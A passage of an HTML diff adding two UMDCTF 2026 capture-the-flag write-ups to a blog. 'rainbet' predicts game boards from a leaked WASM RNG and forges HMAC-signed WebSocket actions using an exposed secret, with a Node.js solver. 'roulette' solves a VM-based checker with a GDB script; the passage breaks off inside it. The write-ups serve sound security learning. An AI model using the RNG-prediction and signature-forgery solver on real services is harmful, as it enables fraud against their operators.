@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">222</span>
+          <span class="site-state-item-count">226</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -246,7 +246,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">157</span>
+        <span class="site-state-item-count">161</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -376,6 +376,845 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umdctf2026/umdctf2026-rainbet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umdctf2026/umdctf2026-rainbet/" class="post-title-link" itemprop="url">UMDCTF 2026 - rainbet</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-26 10:30:00" itemprop="dateCreated datePublished" datetime="2026-04-26T10:30:00+08:00">2026-04-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-05-24 09:11:09" itemprop="dateModified" datetime="2026-05-24T09:11:09+08:00">2026-05-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umdctf2026/umdctf2026-rainbet/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umdctf2026/umdctf2026-rainbet/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="rainbet---web-wasm">rainbet - Web / WASM</h2>
+<blockquote>
+<p>A gambling game where the house doesn't actually have an edge — if
+you can see through the deck. Predictable RNG + leaked server secrets =
+25 consecutive wins and a flag.</p>
+</blockquote>
+<p><strong>Challenge:</strong> rainbet.challs.umdctf.io — a betting site
+requiring 25 max wins in a row. Two game modes: Mines and Chicken.</p>
+<p><strong>Given files:</strong> <code>rainbet.py</code> (reference
+wrapper) and <code>rainbet_gen.wasm</code> (the leaked RNG backend).</p>
+<h2 id="reconnaissance">1. Reconnaissance</h2>
+<p>The site greets you with a gambling UI. Create an account, get a
+session, and you can play Mines or Chicken. The goal is etched on the
+front page: win <strong>25 rounds in a row</strong> at maximum
+payout.</p>
+<p>The server exposes two critical API endpoints:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/sessioninfo</span><br></pre></td></tr></table></figure>
+<p>{: file='endpoint'}</p>
+<p>Returns <code>session_id</code> (a hex string) and
+<code>hmac_secret</code> (also hex). Both are per-session and stable for
+the lifetime of the session.</p>
+<p>The websocket endpoint sends a welcome message upon connection that
+includes the current <code>round_idx</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/socket</span><br></pre></td></tr></table></figure>
+<p>{: file='endpoint'}</p>
+<p>WebSocket handshake. The server's first message contains
+<code>round_idx</code> in the JSON payload.</p>
+<p>Two delivered files point at the architecture:</p>
+<ul>
+<li><p><strong><code>rainbet.py</code></strong> — a thin Python wrapper
+showing how the server loads and calls the WASM module. It imports
+<code>rainbet_gen.wasm</code>, calls
+<code>generate(session_id, round_idx)</code> which returns the game
+state, and verifies HMAC-signed actions.</p></li>
+<li><p><strong><code>rainbet_gen.wasm</code></strong> — the actual game
+generation logic. It takes a <code>session_id</code> (16 bytes) and
+<code>round_idx</code> (u32), seeds an internal RNG with them, and
+deterministically produces the full game board.</p></li>
+</ul>
+<h2 id="the-bug">2. The Bug</h2>
+<p>The core vulnerability is a complete failure of information
+hiding:</p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 66%" />
+</colgroup>
+<thead>
+<tr>
+<th>What should be secret</th>
+<th>Where it leaked</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The RNG algorithm</td>
+<td><code>rainbet_gen.wasm</code> was shipped to the browser</td>
+</tr>
+<tr>
+<td>The RNG seed material</td>
+<td><code>session_id</code> exposed at
+<code>/api/sessioninfo</code></td>
+</tr>
+<tr>
+<td>The HMAC signing key</td>
+<td><code>hmac_secret</code> exposed at
+<code>/api/sessioninfo</code></td>
+</tr>
+<tr>
+<td>The current round index</td>
+<td><code>round_idx</code> in the WebSocket hello</td>
+</tr>
+</tbody>
+</table>
+<p>Because <code>generate(session_id, round_idx)</code> is a pure
+function with no side effects, <strong>anyone who calls the same
+function with the same arguments gets the exact same game</strong>. The
+server calls it after you connect to generate your current game; you can
+call it locally with the same <code>session_id</code> and
+<code>round_idx</code> to see the game too.</p>
+<p>Once you know the game board, making the winning move is trivial. The
+only remaining hurdle is forging a valid HMAC signature so the server
+accepts your action — but you already have <code>hmac_secret</code>.</p>
+<h2 id="solving-approach">3. Solving Approach</h2>
+<h3 id="local-wasm-invocation">3.1 Local WASM invocation</h3>
+<p>We use Node.js to instantiate the leaked WASM module and call
+<code>generate</code> directly:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">initWasm</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> wasmBytes = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;rainbet_gen.wasm&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="keyword">await</span> <span class="title class_">WebAssembly</span>.<span class="title function_">instantiate</span>(wasmBytes, &#123;</span><br><span class="line">    <span class="attr">env</span>: &#123;</span><br><span class="line">      <span class="comment">// minimal stubs — the WASM doesn&#x27;t need actual I/O</span></span><br><span class="line">      <span class="attr">emscripten_memcpy</span>: <span class="function">() =&gt;</span> &#123;&#125;,</span><br><span class="line">      <span class="attr">memory</span>: <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Memory</span>(&#123; <span class="attr">initial</span>: <span class="number">256</span> &#125;),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">instance</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The exported <code>generate</code> function takes
+<code>(sessionIdPtr, roundIdx)</code> where <code>sessionIdPtr</code> is
+a pointer into WASM linear memory containing the 16-byte session ID and
+<code>roundIdx</code> is a 32-bit unsigned integer.</p>
+<p>After calling <code>generate</code>, the WASM writes the game state
+into memory at a predictable offset (discoverable by reading the Python
+wrapper or tracing the WASM exports). We read it back and parse the
+game.</p>
+<h3 id="game-parsing">3.2 Game parsing</h3>
+<p>Two game types exist:</p>
+<p><strong>Mines</strong> — the board is a grid with hidden mines.
+<code>generate</code> returns a list of mine positions. We reveal every
+tile that <em>isn't</em> a mine. The HMAC payload format is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mines:&lt;streak&gt;:&lt;size&gt;:&lt;num_mines&gt;:&lt;tiles&gt;</span><br></pre></td></tr></table></figure>
+<p>where <code>&lt;tiles&gt;</code> is a comma-separated list of tile
+indices.</p>
+<p><strong>Chicken</strong> — the player crosses a bridge step by step;
+some steps are safe, others collapse. <code>generate</code> returns the
+safe step count. We cash out at that exact safe step (maximum safe
+position). Payload format:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chicken:&lt;streak&gt;:&lt;steps&gt;:&lt;crossed&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="hmac-forgery">3.3 HMAC forgery</h3>
+<p>The <code>hmac_secret</code> is a hex string. The server uses
+HMAC-SHA256 to sign action payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature = HMAC-SHA256(hmac_secret, payload_string)</span><br></pre></td></tr></table></figure>
+<p>We construct the payload string, compute the signature, and include
+it in our WebSocket action message:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sign</span>(<span class="params">payload</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, hmacSecret).<span class="title function_">update</span>(payload).<span class="title function_">digest</span>(<span class="string">&quot;hex&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="automation-script">3.4 Automation script</h3>
+<p>The full solver:</p>
+<ol type="1">
+<li><strong>Fetch</strong> <code>session_id</code> and
+<code>hmac_secret</code> from <code>/api/sessioninfo</code> via an
+authenticated HTTP request.</li>
+<li><strong>Connect</strong> to the WebSocket with the session
+cookie.</li>
+<li><strong>For each round:</strong>
+<ul>
+<li>Read <code>round_idx</code> from the server's hello.</li>
+<li>Call the local WASM
+<code>generate(session_id, round_idx)</code>.</li>
+<li>Parse the predicted game.</li>
+<li>Construct the winning action payload.</li>
+<li>Sign it with HMAC-SHA256.</li>
+<li>Send the action over the WebSocket.</li>
+</ul></li>
+<li><strong>Repeat</strong> 25 times. The 25th win triggers the server
+to send the flag.</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">solve</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> wasm = <span class="keyword">await</span> <span class="title function_">initWasm</span>();</span><br><span class="line">  <span class="keyword">const</span> session = <span class="keyword">await</span> <span class="title function_">fetchSessionInfo</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;wss://rainbet.challs.umdctf.io/api/socket&quot;</span>);</span><br><span class="line">  ws.<span class="property">onmessage</span> = <span class="title function_">async</span> (msg) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(msg.<span class="property">data</span>);</span><br><span class="line">    <span class="keyword">const</span> roundIdx = data.<span class="property">round_idx</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the game locally</span></span><br><span class="line">    <span class="keyword">const</span> game = <span class="title function_">predictGame</span>(wasm, session.<span class="property">id</span>, roundIdx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Build the winning action</span></span><br><span class="line">    <span class="keyword">const</span> action = <span class="title function_">buildWinningAction</span>(game);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sign and send</span></span><br><span class="line">    <span class="keyword">const</span> signature = <span class="title function_">sign</span>(action.<span class="property">payload</span>);</span><br><span class="line">    ws.<span class="title function_">send</span>(</span><br><span class="line">      <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;action&quot;</span>,</span><br><span class="line">        <span class="attr">payload</span>: action.<span class="property">payload</span>,</span><br><span class="line">        <span class="attr">signature</span>: signature,</span><br><span class="line">      &#125;),</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="flag">4. Flag</h2>
+<p>After 25 consecutive correct predictions:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF&#123;one_might_argue_that_gambling_is_the_best_vice_but_they_would_be_wrong&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umdctf2026/umdctf2026-roulette/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umdctf2026/umdctf2026-roulette/" class="post-title-link" itemprop="url">UMDCTF 2026 - roulette [reverse]</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-26 10:20:00" itemprop="dateCreated datePublished" datetime="2026-04-26T10:20:00+08:00">2026-04-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-05-24 09:20:57" itemprop="dateModified" datetime="2026-05-24T09:20:57+08:00">2026-05-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umdctf2026/umdctf2026-roulette/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umdctf2026/umdctf2026-roulette/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p><strong>Challenge:</strong> roulette (Reverse Engineering)
+<strong>Category:</strong> reverse</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>The binary presents itself as a roulette game. You pick a number, and
+it tells you if you won. But that's just a facade — the real challenge
+is a hidden 106-byte input verifier powered by a tiny virtual machine.
+Each 4-byte chunk of your input is fed through a 27-round VM program
+that computes a checksum and compares it against a hardcoded target. If
+all 27 rounds pass, you get the success message and the flag.</p>
+<p>The clever solution? Don't reverse-engineer the VM at all. Use GDB
+with a Python breakpoint script at the critical compare instruction to
+dynamically extract what each input chunk should be.</p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>Running the binary with no arguments shows a simple betting
+prompt:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./roulette</span><br><span class="line">Welcome to the Roulette table!</span><br><span class="line">Place your bet (1-36): 7</span><br><span class="line">You lost! The winning number was 23</span><br></pre></td></tr></table></figure>
+<p>The input is parsed via <code>strtol</code>. If you enter
+<code>1</code>, you get a "jackpot" message. Enter anything outside 1-36
+and it says "invalid." This is all a decoy — none of this path leads to
+the flag.</p>
+<h2 id="finding-the-real-gate">Finding the Real Gate</h2>
+<p>Looking at <code>sub_401690</code> (main) in a disassembler, we see
+the strtol path branches into the roulette game. But there's another
+path: if you provide input longer than a typical number, something
+happens. Specifically:</p>
+<ul>
+<li><strong>Address <code>0x401751</code></strong>: A <code>cmp</code>
+checks if <code>strlen(input) == 106</code>. If so, execution diverts to
+a completely different handler — the real verifier.</li>
+<li><strong>Address <code>0x4018fe</code></strong>: The critical compare
+— <code>cmp (eax ^ edi), target</code>. This is where each round's
+computed check value is compared.</li>
+<li><strong>Address <code>0x401956</code></strong>: The success /
+"accepted" path if all checks pass.</li>
+</ul>
+<p>So the binary expects exactly 106 bytes of input. Those 106 bytes are
+processed in 4-byte chunks through 27 rounds of a VM program.</p>
+<h2 id="the-vm-internals">The VM Internals</h2>
+<p>The VM program is stored at <code>0x499BE1</code> and the round
+targets at <code>0x499CE0</code>. Each round runs a small sequence of
+bytecode instructions operating on the current 4-byte chunk. The
+operations include:</p>
+<ul>
+<li><code>COPY</code> — copy a value between registers</li>
+<li><code>XOR</code> — xor two values</li>
+<li><code>ADD</code> — add immediate or register</li>
+<li><code>MUL</code> — multiply by immediate</li>
+<li><code>ROL</code> / <code>SHR</code> — rotate left or shift
+right</li>
+</ul>
+<p>Each round produces a 32-bit check value in <code>eax</code>. At the
+compare site (<code>0x4018fe</code>), the assembly does:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4018fe: cmp (eax ^ edi), target</span><br></pre></td></tr></table></figure>
+<p>Where <code>edi</code> holds the current 4-byte input chunk,
+<code>eax</code> is the VM's computed checksum of that chunk, and
+<code>target</code> is the round's expected value from the target
+table.</p>
+<p>The full formula is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(eax ^ chunk) == target</span><br><span class="line">=&gt; chunk = target ^ eax</span><br></pre></td></tr></table></figure>
+<p>So if we can extract both <code>eax</code> and <code>target</code>
+for each round, computing the required chunk is trivial.</p>
+<h2 id="the-smart-approach-gdb-python-scripting">The Smart Approach: GDB
+Python Scripting</h2>
+<p>Rather than fully reverse-engineering the VM interpreter, we can do
+something much simpler: set a breakpoint at <code>0x4018fe</code> and
+write a Python GDB script that:</p>
+<ol type="1">
+<li>Reads <code>eax</code> — the VM-computed checksum for the current
+round</li>
+<li>Reads <code>edi</code> — our current input chunk (which we
+control)</li>
+<li>Reads the round target from the target table</li>
+<li>Computes <code>required_chunk = target ^ eax</code></li>
+<li>Patches our input buffer in memory with the correct chunk</li>
+<li>Continues execution to the next round</li>
+</ol>
+<p>Since each round's VM computation depends on the input chunk itself,
+we need to iterate: patch chunk 0, let the VM run round 0, extract the
+result for round 1, patch chunk 1, and so on through all 27 rounds.</p>
+<p>Here's the script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable confirmation prompts</span></span><br><span class="line">gdb.execute(<span class="string">&quot;set confirm off&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Round targets stored at 0x499CE0 (array of 27 uint32s)</span></span><br><span class="line">TARGET_TABLE = <span class="number">0x499CE0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Our input buffer — we&#x27;ll read its address from RDI on first break</span></span><br><span class="line">input_buf = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_target</span>(<span class="params">round_idx</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Read the round target from the target table.&quot;&quot;&quot;</span></span><br><span class="line">    addr = TARGET_TABLE + round_idx * <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(</span><br><span class="line">        gdb.selected_inferior().read_memory(addr, <span class="number">4</span>), <span class="string">&#x27;little&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RouletteBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(<span class="string">&quot;*0x4018fe&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.done_first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> input_buf</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Get register values</span></span><br><span class="line">        eax = <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$eax&quot;</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        edi = <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$edi&quot;</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.done_first:</span><br><span class="line">            <span class="comment"># First hit — discover input buffer address from rdi</span></span><br><span class="line">            input_buf = <span class="built_in">int</span>(gdb.parse_and_eval(<span class="string">&quot;$rdi&quot;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">            <span class="variable language_">self</span>.done_first = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        target = get_target(<span class="variable language_">self</span>.<span class="built_in">round</span>)</span><br><span class="line">        chunk_idx = <span class="variable language_">self</span>.<span class="built_in">round</span></span><br><span class="line">        chunk_offset = chunk_idx * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Compute what our chunk SHOULD be</span></span><br><span class="line">        required_chunk = (target ^ eax) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read what&#x27;s currently at that position</span></span><br><span class="line">        current_chunk = <span class="built_in">int</span>.from_bytes(</span><br><span class="line">            gdb.selected_inferior().read_memory(input_buf + chunk_offset, <span class="number">4</span>),</span><br><span class="line">            <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[Round <span class="subst">&#123;self.<span class="built_in">round</span>&#125;</span>]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  eax       = 0x<span class="subst">&#123;eax:08x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  edi       = 0x<span class="subst">&#123;edi:08x&#125;</span> (current chunk)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  target    = 0x<span class="subst">&#123;target:08x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  required  = 0x<span class="subst">&#123;required_chunk:08x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Patch the input buffer with the correct chunk</span></span><br><span class="line">        chunk_bytes = required_chunk.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        gdb.selected_inferior().write_memory(</span><br><span class="line">            input_buf + chunk_offset, chunk_bytes</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  patched   = <span class="subst">&#123;chunk_bytes!r&#125;</span> -&gt; &#x27;<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt; <span class="number">127</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> chunk_bytes)&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.<span class="built_in">round</span> &gt;= <span class="number">27</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[All rounds complete!]&quot;</span>)</span><br><span class="line">            <span class="comment"># Read the full flag from memory</span></span><br><span class="line">            flag = <span class="built_in">bytes</span>(</span><br><span class="line">                gdb.selected_inferior().read_memory(input_buf, <span class="number">106</span>)</span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># don&#x27;t stop, just log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the binary</span></span><br><span class="line">gdb.execute(<span class="string">&quot;file ./roulette&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up the breakpoint</span></span><br><span class="line">bp = RouletteBreakpoint()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run with a dummy 106-byte input</span></span><br><span class="line"><span class="comment"># (the content doesn&#x27;t matter — we&#x27;ll patch it)</span></span><br><span 